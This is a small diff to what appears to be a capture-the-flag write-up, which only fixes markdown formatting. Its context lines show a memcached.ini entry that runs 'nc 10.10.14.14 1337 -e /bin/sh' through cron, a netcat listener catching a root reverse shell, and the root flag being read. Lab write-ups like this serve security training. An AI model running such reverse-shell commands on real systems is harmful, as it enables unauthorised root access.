@@ -334,6 +334,7 @@ command = /usr/bin/nc 10.10.14.14 1337 -e /bin/sh' > memcached.ini
 ```
 
 Set up a nc listener on port 1337 and wait for the cron to run. Eventually we get a reverse shell as root.
+
 ```
 root@kali: nc -nlvp 1337
 Listening on [0.0.0.0] (family 2, port 1337)
@@ -342,4 +343,4 @@ whoami
 root
 cat /root/root.txt
 58[REDACTED]11
-``
+```
